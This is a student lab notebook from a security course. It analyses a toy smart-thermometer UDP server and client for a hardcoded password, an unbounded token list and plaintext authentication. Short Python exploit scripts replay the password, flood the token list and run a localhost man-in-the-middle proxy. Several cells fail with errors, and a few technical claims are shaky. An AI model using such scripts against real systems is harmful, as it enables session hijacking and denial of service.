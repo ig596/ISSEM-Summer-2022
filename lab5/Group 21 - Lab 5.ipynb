{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "8b478961",
   "metadata": {},
   "source": [
    "# Group 21 Lab 5\n",
    "##### Group Members: (Andrew Quijano, afq2003), (Isaiah Genis | ig596), (Jamie Leach | jhl925), (Yevhen Pankevych | yp2525)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e0416ef1",
   "metadata": {},
   "source": [
    "Your first goal as a Security Engineer who wants to ensure the security of the application is to identify security vulnerabilities in the project and create testcases to exploit them. In the real world, applications are often tested with test scripts. The following are a few questions a Security Engineer would ask when writing a testcase to test the Security of their application:\n",
    "\n",
    "* \"Does this application protect the confidentiaility of data?\"\n",
    "* \"Does this application hamper performance?\"\n",
    "* \"Does this application prevent actions that shoudl be allowed?\"\n",
    "\n",
    "Notice that these questions are parallel to security paradigms: Security, Efficiency and Accuracy, Availability. If you can find a hypothesis where a security paradigm is not met that would mean the application is not secure and a possible exploit exist. The testcases can be written in python or bash."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "08bc03fa",
   "metadata": {},
   "source": [
    "### Task:\n",
    "We have listed hints for 3 vulnerabilities below which are currently present in code. Your task is to explain how it violates the security regulations (in terms of the above questions) and then provide the testcases to demonstrate how these vulnerabilities can be exploited.\n",
    "* Password is Hardcoded (SampleNetworkClient.py)\n",
    "* Token List has the potential to continuously grow (SampleNetworkServer.py)\n",
    "* Plaintext authentication token and authentication (SampleNetworkClient.py)\n",
    "\n",
    "### Submission:\n",
    "For each vulnerability above:\n",
    "\n",
    "1. describe how it answers the three questions mentioned above.\n",
    "2. Provide test cases (in python or bash) to demonstrate how these vulnerabilities can be exploited."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f88ed5f1",
   "metadata": {},
   "source": [
    "### Part 1: Describe how each Vulnerability answers the three questions mentioned above."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0c412a19",
   "metadata": {},
   "source": [
    "#### Password is Hardcoded (SampleNetworkClient.py)\n",
    "\n",
    "* \"Does this application protect the confidentiality of data?\"\n",
    "    * No, Because the Password is Hardcoded (SampleNetworkClient.py) the application cannot protect the confidentiality of data. \n",
    "       1. This is because a vulnerability was discovered in the ‘SampleNetworkClient.py’ part of the application, shown below, which contains a function that passes/stores a hardcoded password value to send it within a message to the Server side socket. Hardcoded credentials generally pose a security risk to an application as an attacker can reverse engineer the code to obtain the password to use elsewhere. In this case an attacker would be able to impersonate/seize the client’s account as their username/password has been exposed. The relevant code has been commented below and a test case has been written in Python/Bash to demonstrate how to exploit this vulnerability."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "4640e0e5",
   "metadata": {},
   "outputs": [],
   "source": [
    "##### SampleNetworkClient.py:\n",
    "def authenticate(self, p, pw) : #pw variable here takes in raw input from user/client calling the function.\n",
    "        s = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)\n",
    "        s.sendto(b\"AUTH %s\" % pw, (\"127.0.0.1\", p)) #pw variable here is exposed and/or is not used in authentication\n",
    "        msg, addr = s.recvfrom(1024)\n",
    "        return msg.strip()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ce82fca7",
   "metadata": {},
   "source": [
    "* \"Does this application hamper performance?\"\n",
    "    * No in most cases a hardcoded password mentioned before usually speeds up the overall client/user experience in authentication however this poses a risk to the overall security/performance as the password is not able to be easily changed if it has been compromised. "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "25f15833",
   "metadata": {},
   "source": [
    "* \"Does this application prevent actions that should be allowed?\"\n",
    "    * No, Because the password is hardcoded into the application an attacker can easily hijack a user profile/session in order to preform 'unintended' actions at that layer. Additionally there is no 'trust' model with a hard coded credential, in theory it would be hard to differentiate what user and activity should be allowed vs those that are not."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1eea3364",
   "metadata": {},
   "source": [
    "#### Token List has the potential to continuously grow (SampleNetworkServer.py)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cb3bfcf6",
   "metadata": {},
   "source": [
    "* \"Does this application protect the confidentiality of data?\"\n",
    "\n",
    "    * No, Because the Token List has the potential to continuously grow (SampleNetworkServer.py) the application cannot ensure the confidentiality of data. \n",
    "        1. This is because the continually growing list of tokens and which tie to user related sessions can be used to identify/track valid logged in user sessions and does so in one continuously growing list...providing a single point of attack/failure as well. Plaintext session tokens continuously added to a list overall can compromise active sessions within the application as an attacker can easily identify which user/session is running on the system and could potentially terminate a client’s session and can also lead to a Man-in-the-middle attack, which allows an attacker to obtain an unencrypted token and use it to either impersonate and act on behalf of a legitimate user or to observe traffic between the server and the host."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c9da9973",
   "metadata": {},
   "source": [
    "* \"Does this application hamper performance?\"\n",
    "\n",
    "    * Yes, the application currently hampers performance in several ways:\n",
    "        1. A vulnerability was discovered in the ‘SampleNetworkServer.py’ part of the application which allows the array “self.tokens”, that is used to stores generated token values for each authenticated session, to continuously grow if authenticated sessions continually occur without ‘logouts’. This vulnerability can lead to performance issues should the list become too long and could also lead to a buffer overflow if attacked. The relevant code has been commented below and a test case has been written in Python/Bash to demonstrate this vulnerability."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "12415ae1",
   "metadata": {},
   "outputs": [],
   "source": [
    "# SampleNetworkServer.py\n",
    "def processCommands(self, msg, addr) :\n",
    "        cmds = msg.split(';')\n",
    "        for c in cmds :\n",
    "            cs = c.split(' ')\n",
    "            if len(cs) == 2 : #should be either AUTH or LOGOUT\n",
    "                if cs[0] == \"AUTH\":\n",
    "                    if cs[1] == \"!Q#E%T&U8i6y4r2w\" :\n",
    "                        self.tokens.append(''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16)))\n",
    "                        #self.tokens.append is a vulnerability as there is no limit specified for the array\n",
    "                        self.serverSocket.sendto(self.tokens[-1].encode(\"utf-8\"), addr)\n",
    "                        #print (self.tokens[-1])\n",
    "                elif cs[0] == \"LOGOUT\":\n",
    "                    if cs[1] in self.tokens :\n",
    "                        self.tokens.remove(cs[1])\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "91d238b7",
   "metadata": {},
   "source": [
    "* \"Does this application prevent actions that should be allowed?\"\n",
    "\n",
    "    * Yes, this system has potential vulnerabilities that can cause a refusal to perform the correct action\n",
    "        1. Also, the system can potentially become unavailable due to a DOS attack aimed at overflowing the list of available tokens or calling the logout procedure with any data (‘SampleNetworkServer.py’) - this is possible due to the fact that the size of the list is not fixed and can be quite large - then the time to search for an invalid token will be equal to the viewing time of all items in the list, which can cause delays in the operation of the server, up to the failure of its operation. The relevant code has been highlighted below."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ab7db039",
   "metadata": {},
   "outputs": [],
   "source": [
    "def processCommands(self, msg, addr) :\n",
    "        cmds = msg.split(';')\n",
    "        for c in cmds :\n",
    "            cs = c.split(' ')\n",
    "            if len(cs) == 2 : #should be either AUTH or LOGOUT\n",
    "                if cs[0] == \"AUTH\":\n",
    "                    if cs[1] == \"!Q#E%T&U8i6y4r2w\" :\n",
    "                        self.tokens.append(''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16)))\n",
    "                        self.serverSocket.sendto(self.tokens[-1].encode(\"utf-8\"), addr)\n",
    "                        #print (self.tokens[-1])\n",
    "                elif cs[0] == \"LOGOUT\":\n",
    "                    if cs[1] in self.tokens :#The array is not fixed limit and could DDOS system if the list becomes too large/attacked \n",
    "                        self.tokens.remove(cs[1])\n",
    "                else : #unknown command\n",
    "                    self.serverSocket.sendto(b\"Invalid Command\\n\", addr)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "df5ca1b7",
   "metadata": {},
   "source": [
    "#### Plaintext authentication token and authentication (SampleNetworkClient.py)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "db5cd67b",
   "metadata": {},
   "source": [
    "* Does this application protect the confidentiality of data?\"\n",
    "\n",
    "    * No, Because the authentication token and authentication is sent across in plaintext (SampleNetworkClient.py) the application cannot ensure the confidentiality of data. \n",
    "        1. This vulnerability was discovered in the ‘SampleNetworkClient.py’ & ‘SampleNetworkServer.py’ part of the application, shown below, which contains plaintext authentication tokens, which are values used to identify/track valid logged in user sessions and passes these values between the Client and Server side sockets. Plaintext session tokens jeopardize active sessions within the application as an attacker can easily identify which user/session is running on the system and could potentially terminate a client’s session. This vulnerability also enables a Man-in-the-middle attack, which allows an attacker to obtain an unencrypted token and use it to impersonate and act on behalf of a legitimate user. The relevant code has been commented below and a test case has been written in Python/Bash to demonstrate how to exploit this vulnerability."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "3fac6018",
   "metadata": {},
   "outputs": [
    {
     "ename": "IndentationError",
     "evalue": "unindent does not match any outer indentation level (<tokenize>, line 7)",
     "output_type": "error",
     "traceback": [
      "\u001b[1;36m  File \u001b[1;32m<tokenize>:7\u001b[1;36m\u001b[0m\n\u001b[1;33m    def updateIncTemp(self, frame) :\u001b[0m\n\u001b[1;37m    ^\u001b[0m\n\u001b[1;31mIndentationError\u001b[0m\u001b[1;31m:\u001b[0m unindent does not match any outer indentation level\n"
     ]
    }
   ],
   "source": [
    "#SampleNetworkClient.py:\n",
    "def updateInfTemp(self, frame) :\n",
    "        self.updateTime()\n",
    "        if self.infToken is None : #not yet authenticated\n",
    "            self.infToken = self.authenticate(self.infPort, b\"!Q#E%T&U8i6y4r2w\") # this token is exposed/plaintext\n",
    "\n",
    "  def updateIncTemp(self, frame) :\n",
    "        self.updateTime()\n",
    "        if self.incToken is None : #not yet authenticated\n",
    "            self.incToken = self.authenticate(self.incPort, b\"!Q#E%T&U8i6y4r2w\") # this token is exposed/plaintext"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "7d777543",
   "metadata": {},
   "outputs": [
    {
     "ename": "NameError",
     "evalue": "name 'cs' is not defined",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "Input \u001b[1;32mIn [9]\u001b[0m, in \u001b[0;36m<cell line: 2>\u001b[1;34m()\u001b[0m\n\u001b[0;32m      1\u001b[0m \u001b[38;5;66;03m#SampleNetworkServer.py:\u001b[39;00m\n\u001b[1;32m----> 2\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;28mlen\u001b[39m(\u001b[43mcs\u001b[49m) \u001b[38;5;241m==\u001b[39m \u001b[38;5;241m2\u001b[39m : \u001b[38;5;66;03m#should be either AUTH or LOGOUT\u001b[39;00m\n\u001b[0;32m      3\u001b[0m                 \u001b[38;5;28;01mif\u001b[39;00m cs[\u001b[38;5;241m0\u001b[39m] \u001b[38;5;241m==\u001b[39m \u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mAUTH\u001b[39m\u001b[38;5;124m\"\u001b[39m:\n\u001b[0;32m      4\u001b[0m                     \u001b[38;5;28;01mif\u001b[39;00m cs[\u001b[38;5;241m1\u001b[39m] \u001b[38;5;241m==\u001b[39m \u001b[38;5;124m\"\u001b[39m\u001b[38;5;124m!Q#E\u001b[39m\u001b[38;5;124m%\u001b[39m\u001b[38;5;124mT&U8i6y4r2w\u001b[39m\u001b[38;5;124m\"\u001b[39m : \u001b[38;5;66;03m# this token is exposed/plaintext\u001b[39;00m\n",
      "\u001b[1;31mNameError\u001b[0m: name 'cs' is not defined"
     ]
    }
   ],
   "source": [
    "#SampleNetworkServer.py:\n",
    "if len(cs) == 2 : #should be either AUTH or LOGOUT\n",
    "                if cs[0] == \"AUTH\":\n",
    "                    if cs[1] == \"!Q#E%T&U8i6y4r2w\" : # this token is exposed/plaintext\n",
    "                        self.tokens.append(''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16)))\n",
    "                        self.serverSocket.sendto(self.tokens[-1].encode(\"utf-8\"), addr)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "38d5d9dd",
   "metadata": {},
   "source": [
    "* \"Does this application hamper performance?\"\n",
    "    * Yes technically an unencrypted/plaintext token or password can be used to hamper system preformance as the unencrypted token/pass, as mentioned earlier, can be intercepted by an attacker and used to cause deauthentication of that user. Thus, a legitimate user will lose access to the system and require re-authentication."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "95a65e58",
   "metadata": {},
   "source": [
    "* \"Does this application prevent actions that should be allowed?\"\n",
    "    * Yes and No, Because the authentication token is passed plaintext into the application an attacker can easily intercept these and hijack a users session in order to preform 'unintended' actions. However compromised authentication tokens can in theory be regenerated for a user easily compared to a password."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b9650e24",
   "metadata": {},
   "source": [
    "### Part 2\n",
    "Sample exploit scirpts intended to be written in the SampleNetwork Server.py script to run"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "544e9c08",
   "metadata": {},
   "outputs": [
    {
     "ename": "NameError",
     "evalue": "name 'socket' is not defined",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "Input \u001b[1;32mIn [2]\u001b[0m, in \u001b[0;36m<cell line: 2>\u001b[1;34m()\u001b[0m\n\u001b[0;32m      1\u001b[0m \u001b[38;5;66;03m# 1- Get Hard Coded Password\u001b[39;00m\n\u001b[1;32m----> 2\u001b[0m sock \u001b[38;5;241m=\u001b[39m \u001b[43msocket\u001b[49m\u001b[38;5;241m.\u001b[39msocket(family\u001b[38;5;241m=\u001b[39msocket\u001b[38;5;241m.\u001b[39mAF_INET, \u001b[38;5;28mtype\u001b[39m\u001b[38;5;241m=\u001b[39msocket\u001b[38;5;241m.\u001b[39mSOCK_DGRAM)\n\u001b[0;32m      3\u001b[0m sock\u001b[38;5;241m.\u001b[39msendto(\u001b[38;5;124mb\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mAUTH !Q#E\u001b[39m\u001b[38;5;124m%\u001b[39m\u001b[38;5;124mT&U8i6y4r2w\u001b[39m\u001b[38;5;124m\"\u001b[39m, (\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124m127.0.0.1\u001b[39m\u001b[38;5;124m\"\u001b[39m, \u001b[38;5;241m23456\u001b[39m))\n\u001b[0;32m      4\u001b[0m \u001b[38;5;28mprint\u001b[39m(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124msent\u001b[39m\u001b[38;5;124m\"\u001b[39m)\n",
      "\u001b[1;31mNameError\u001b[0m: name 'socket' is not defined"
     ]
    }
   ],
   "source": [
    "# 1- Get Hard Coded Password\n",
    "sock = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)\n",
    "sock.sendto(b\"AUTH !Q#E%T&U8i6y4r2w\", (\"127.0.0.1\", 23456))\n",
    "print(\"sent\")\n",
    "token, addr = sock.recvfrom(1024)\n",
    "token = token.decode()\n",
    "print(\"token\", token)\n",
    "sock.sendto((\"LOGOUT \" + token).encode(), (\"127.0.0.1\", 23456))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "2731fa2c",
   "metadata": {},
   "outputs": [
    {
     "ename": "NameError",
     "evalue": "name 'sock' is not defined",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "Input \u001b[1;32mIn [3]\u001b[0m, in \u001b[0;36m<cell line: 2>\u001b[1;34m()\u001b[0m\n\u001b[0;32m      1\u001b[0m \u001b[38;5;66;03m# 2- Token List Grows, probably increase to VERY big number?\u001b[39;00m\n\u001b[0;32m      2\u001b[0m \u001b[38;5;28;01mfor\u001b[39;00m i \u001b[38;5;129;01min\u001b[39;00m \u001b[38;5;28mrange\u001b[39m(\u001b[38;5;241m10\u001b[39m):\n\u001b[1;32m----> 3\u001b[0m     \u001b[43msock\u001b[49m\u001b[38;5;241m.\u001b[39msendto(\u001b[38;5;124mb\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mAUTH !Q#E\u001b[39m\u001b[38;5;124m%\u001b[39m\u001b[38;5;124mT&U8i6y4r2w\u001b[39m\u001b[38;5;124m\"\u001b[39m, (\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124m127.0.0.1\u001b[39m\u001b[38;5;124m\"\u001b[39m, \u001b[38;5;241m23456\u001b[39m))\n\u001b[0;32m      4\u001b[0m     token, addr \u001b[38;5;241m=\u001b[39m sock\u001b[38;5;241m.\u001b[39mrecvfrom(\u001b[38;5;241m1024\u001b[39m)\n\u001b[0;32m      5\u001b[0m     token \u001b[38;5;241m=\u001b[39m token\u001b[38;5;241m.\u001b[39mdecode()\n",
      "\u001b[1;31mNameError\u001b[0m: name 'sock' is not defined"
     ]
    }
   ],
   "source": [
    "# 2- Token List Grows, probably increase to VERY big number?\n",
    "for i in range(10):\n",
    "    sock.sendto(b\"AUTH !Q#E%T&U8i6y4r2w\", (\"127.0.0.1\", 23456))\n",
    "    token, addr = sock.recvfrom(1024)\n",
    "    token = token.decode()\n",
    "    print(\"DDOS LIST TOKEN\", token)\n",
    "\n",
    "    # because an invalid token is passed, no token is removed in self.list\n",
    "    sock.sendto(b\"LOGOUT random-token\", (\"127.0.0.1\", 23456))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "d3363fae",
   "metadata": {},
   "outputs": [
    {
     "ename": "ModuleNotFoundError",
     "evalue": "No module named 'fcntl'",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mModuleNotFoundError\u001b[0m                       Traceback (most recent call last)",
      "Input \u001b[1;32mIn [4]\u001b[0m, in \u001b[0;36m<cell line: 4>\u001b[1;34m()\u001b[0m\n\u001b[0;32m      1\u001b[0m \u001b[38;5;66;03m#Exploit script for “Plaintext authentication token and authentication ”:\u001b[39;00m\n\u001b[0;32m      3\u001b[0m \u001b[38;5;28;01mimport\u001b[39;00m \u001b[38;5;21;01msocket\u001b[39;00m\n\u001b[1;32m----> 4\u001b[0m \u001b[38;5;28;01mimport\u001b[39;00m \u001b[38;5;21;01mfcntl\u001b[39;00m\n\u001b[0;32m      5\u001b[0m \u001b[38;5;28;01mimport\u001b[39;00m \u001b[38;5;21;01mos\u001b[39;00m\n\u001b[0;32m      7\u001b[0m serverSocket \u001b[38;5;241m=\u001b[39m socket\u001b[38;5;241m.\u001b[39msocket(family\u001b[38;5;241m=\u001b[39msocket\u001b[38;5;241m.\u001b[39mAF_INET, \u001b[38;5;28mtype\u001b[39m\u001b[38;5;241m=\u001b[39msocket\u001b[38;5;241m.\u001b[39mSOCK_DGRAM)\n",
      "\u001b[1;31mModuleNotFoundError\u001b[0m: No module named 'fcntl'"
     ]
    }
   ],
   "source": [
    "#Exploit script for “Plaintext authentication token and authentication ”:\n",
    "\n",
    "import socket\n",
    "import fcntl\n",
    "import os\n",
    "\n",
    "serverSocket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)\n",
    "serverSocket.bind((\"127.0.0.2\", 23456))\n",
    "fcntl.fcntl(serverSocket, fcntl.F_SETFL, os.O_NONBLOCK)\n",
    "\n",
    "clientSocket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)\n",
    "\n",
    "#let's assume that this is a proxy and client connected to it, thinking it is a real server\n",
    "while True:\n",
    "    msg, addr = serverSocket.recvfrom(1024)\n",
    "    \n",
    "    print(\"Hacked Message: \", msg, addr)\n",
    "    \n",
    "    clientSocket.sendto(msg, (\"127.0.0.1\", 23456))\n",
    "    \n",
    "    serverSocket.sendto(server_msg, addr) #send server answer back to the user\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "dcb23219",
   "metadata": {},
   "outputs": [
    {
     "ename": "NameError",
     "evalue": "name 'fcntl' is not defined",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "Input \u001b[1;32mIn [5]\u001b[0m, in \u001b[0;36m<cell line: 4>\u001b[1;34m()\u001b[0m\n\u001b[0;32m      2\u001b[0m mitmSocket \u001b[38;5;241m=\u001b[39m socket\u001b[38;5;241m.\u001b[39msocket(family\u001b[38;5;241m=\u001b[39msocket\u001b[38;5;241m.\u001b[39mAF_INET, \u001b[38;5;28mtype\u001b[39m\u001b[38;5;241m=\u001b[39msocket\u001b[38;5;241m.\u001b[39mSOCK_DGRAM)\n\u001b[0;32m      3\u001b[0m mitmSocket\u001b[38;5;241m.\u001b[39mbind((\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124m127.0.0.2\u001b[39m\u001b[38;5;124m\"\u001b[39m, \u001b[38;5;241m23456\u001b[39m))\n\u001b[1;32m----> 4\u001b[0m \u001b[43mfcntl\u001b[49m\u001b[38;5;241m.\u001b[39mfcntl(mitmSocket, fcntl\u001b[38;5;241m.\u001b[39mF_SETFL, os\u001b[38;5;241m.\u001b[39mO_NONBLOCK)\n\u001b[0;32m      6\u001b[0m \u001b[38;5;66;03m# 3 Client authenticates, MITM grabs Client Auth Token\u001b[39;00m\n\u001b[0;32m      7\u001b[0m sock\u001b[38;5;241m.\u001b[39msendto(\u001b[38;5;124mb\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mAUTH !Q#E\u001b[39m\u001b[38;5;124m%\u001b[39m\u001b[38;5;124mT&U8i6y4r2w\u001b[39m\u001b[38;5;124m\"\u001b[39m, (\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124m127.0.0.2\u001b[39m\u001b[38;5;124m\"\u001b[39m, \u001b[38;5;241m23456\u001b[39m))\n",
      "\u001b[1;31mNameError\u001b[0m: name 'fcntl' is not defined"
     ]
    }
   ],
   "source": [
    "# 3- Plaintext authentication, use MITM to capture stuff\n",
    "mitmSocket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)\n",
    "mitmSocket.bind((\"127.0.0.2\", 23456))\n",
    "fcntl.fcntl(mitmSocket, fcntl.F_SETFL, os.O_NONBLOCK)\n",
    "\n",
    "# 3 Client authenticates, MITM grabs Client Auth Token\n",
    "sock.sendto(b\"AUTH !Q#E%T&U8i6y4r2w\", (\"127.0.0.2\", 23456))\n",
    "auth_password, client_addr = mitmSocket.recvfrom(1024)\n",
    "print(\"MITM STOLE\", auth_password)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "7581a538",
   "metadata": {},
   "outputs": [
    {
     "ename": "NameError",
     "evalue": "name 'auth_password' is not defined",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "Input \u001b[1;32mIn [6]\u001b[0m, in \u001b[0;36m<cell line: 2>\u001b[1;34m()\u001b[0m\n\u001b[0;32m      1\u001b[0m \u001b[38;5;66;03m# MITM captures plaintext password and forwards to server.\u001b[39;00m\n\u001b[1;32m----> 2\u001b[0m mitmSocket\u001b[38;5;241m.\u001b[39msendto(\u001b[43mauth_password\u001b[49m, (\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124m127.0.0.1\u001b[39m\u001b[38;5;124m\"\u001b[39m, \u001b[38;5;241m23456\u001b[39m))\n\u001b[0;32m      3\u001b[0m \u001b[38;5;66;03m# Give MITM time to send the request and have the token stealing time to complete.\u001b[39;00m\n\u001b[0;32m      4\u001b[0m time\u001b[38;5;241m.\u001b[39msleep(\u001b[38;5;241m5\u001b[39m)\n",
      "\u001b[1;31mNameError\u001b[0m: name 'auth_password' is not defined"
     ]
    }
   ],
   "source": [
    "# MITM captures plaintext password and forwards to server.\n",
    "mitmSocket.sendto(auth_password, (\"127.0.0.1\", 23456))\n",
    "# Give MITM time to send the request and have the token stealing time to complete.\n",
    "time.sleep(5)\n",
    "token, real_server_addr = mitmSocket.recvfrom(1024)\n",
    "print(\"MITM STOLE TOKEN\", token, real_server_addr)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f1618be7",
   "metadata": {},
   "source": [
    "### Extra:\n",
    "Full Samplenetworkserver.py including the above mentioned scripts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "ee01478a",
   "metadata": {},
   "outputs": [
    {
     "ename": "ModuleNotFoundError",
     "evalue": "No module named 'matplotlib'",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mModuleNotFoundError\u001b[0m                       Traceback (most recent call last)",
      "Input \u001b[1;32mIn [1]\u001b[0m, in \u001b[0;36m<cell line: 2>\u001b[1;34m()\u001b[0m\n\u001b[0;32m      1\u001b[0m \u001b[38;5;28;01mimport\u001b[39;00m \u001b[38;5;21;01mthreading\u001b[39;00m\n\u001b[1;32m----> 2\u001b[0m \u001b[38;5;28;01mimport\u001b[39;00m \u001b[38;5;21;01mmatplotlib\u001b[39;00m\u001b[38;5;21;01m.\u001b[39;00m\u001b[38;5;21;01mpyplot\u001b[39;00m \u001b[38;5;28;01mas\u001b[39;00m \u001b[38;5;21;01mplt\u001b[39;00m\n\u001b[0;32m      3\u001b[0m \u001b[38;5;28;01mimport\u001b[39;00m \u001b[38;5;21;01mmatplotlib\u001b[39;00m\u001b[38;5;21;01m.\u001b[39;00m\u001b[38;5;21;01manimation\u001b[39;00m \u001b[38;5;28;01mas\u001b[39;00m \u001b[38;5;21;01manimation\u001b[39;00m\n\u001b[0;32m      4\u001b[0m \u001b[38;5;28;01mimport\u001b[39;00m \u001b[38;5;21;01minfinc\u001b[39;00m\n",
      "\u001b[1;31mModuleNotFoundError\u001b[0m: No module named 'matplotlib'"
     ]
    }
   ],
   "source": [
    "import threading\n",
    "import matplotlib.pyplot as plt\n",
    "import matplotlib.animation as animation\n",
    "import infinc\n",
    "import time\n",
    "import math\n",
    "import socket\n",
    "import fcntl\n",
    "import os\n",
    "import errno\n",
    "import random\n",
    "import string\n",
    "from SampleNetworkClient import *\n",
    "\n",
    "class SmartNetworkThermometer (threading.Thread) :\n",
    "    open_cmds = [\"AUTH\", \"LOGOUT\"]\n",
    "    prot_cmds = [\"SET_DEGF\", \"SET_DEGC\", \"SET_DEGK\", \"GET_TEMP\", \"UPDATE_TEMP\"]\n",
    "\n",
    "    def __init__ (self, source, updatePeriod, port) :\n",
    "        threading.Thread.__init__(self, daemon = True) \n",
    "        #set daemon to be true, so it doesn't block program from exiting\n",
    "        self.source = source\n",
    "        self.updatePeriod = updatePeriod\n",
    "        self.curTemperature = 0\n",
    "        self.updateTemperature()\n",
    "        self.tokens = []\n",
    "\n",
    "        self.serverSocket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)\n",
    "        self.serverSocket.bind((\"127.0.0.1\", port))\n",
    "        fcntl.fcntl(self.serverSocket, fcntl.F_SETFL, os.O_NONBLOCK)\n",
    "\n",
    "        self.deg = \"K\"\n",
    "\n",
    "    def setSource(self, source) :\n",
    "        self.source = source\n",
    "\n",
    "    def setUpdatePeriod(self, updatePeriod) :\n",
    "        self.updatePeriod = updatePeriod \n",
    "\n",
    "    def setDegreeUnit(self, s) :\n",
    "        self.deg = s\n",
    "        if self.deg not in [\"F\", \"K\", \"C\"] :\n",
    "            self.deg = \"K\"\n",
    "\n",
    "    def updateTemperature(self) :\n",
    "        self.curTemperature = self.source.getTemperature()\n",
    "\n",
    "    def getTemperature(self) :\n",
    "        if self.deg == \"C\" :\n",
    "            return self.curTemperature - 273\n",
    "        if self.deg == \"F\" :\n",
    "            return (self.curTemperature - 273) * 9 / 5 + 32\n",
    "\n",
    "        return self.curTemperature\n",
    "\n",
    "    def processCommands(self, msg, addr) :\n",
    "        cmds = msg.split(';')\n",
    "        for c in cmds :\n",
    "            cs = c.split(' ')\n",
    "            if len(cs) == 2 : #should be either AUTH or LOGOUT\n",
    "                if cs[0] == \"AUTH\":\n",
    "                    if cs[1] == \"!Q#E%T&U8i6y4r2w\" :\n",
    "                        self.tokens.append(''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16)))\n",
    "                        self.serverSocket.sendto(self.tokens[-1].encode(\"utf-8\"), addr)\n",
    "                        #print (self.tokens[-1])\n",
    "                elif cs[0] == \"LOGOUT\":\n",
    "                    if cs[1] in self.tokens :\n",
    "                        self.tokens.remove(cs[1])\n",
    "                else : #unknown command\n",
    "                    self.serverSocket.sendto(b\"Invalid Command\\n\", addr)\n",
    "            elif c == \"SET_DEGF\" :\n",
    "                self.deg = \"F\"\n",
    "            elif c == \"SET_DEGC\" :\n",
    "                self.deg = \"C\"\n",
    "            elif c == \"SET_DEGK\" :\n",
    "                self.deg = \"K\"\n",
    "            elif c == \"GET_TEMP\" :\n",
    "                self.serverSocket.sendto(b\"%f\\n\" % self.getTemperature(), addr)\n",
    "            elif c == \"UPDATE_TEMP\" :\n",
    "                self.updateTemperature()\n",
    "            elif c :\n",
    "                self.serverSocket.sendto(b\"Invalid Command\\n\", addr)\n",
    "\n",
    "\n",
    "    def run(self) : #the running function\n",
    "        while True : \n",
    "            try :\n",
    "                msg, addr = self.serverSocket.recvfrom(1024)\n",
    "                msg = msg.decode(\"utf-8\").strip()\n",
    "                cmds = msg.split(' ')\n",
    "                if len(cmds) == 1 : # protected commands case\n",
    "                    semi = msg.find(';')\n",
    "                    if semi != -1 : #if we found the semicolon\n",
    "                        #print (msg)\n",
    "                        if msg[:semi] in self.tokens : #if its a valid token\n",
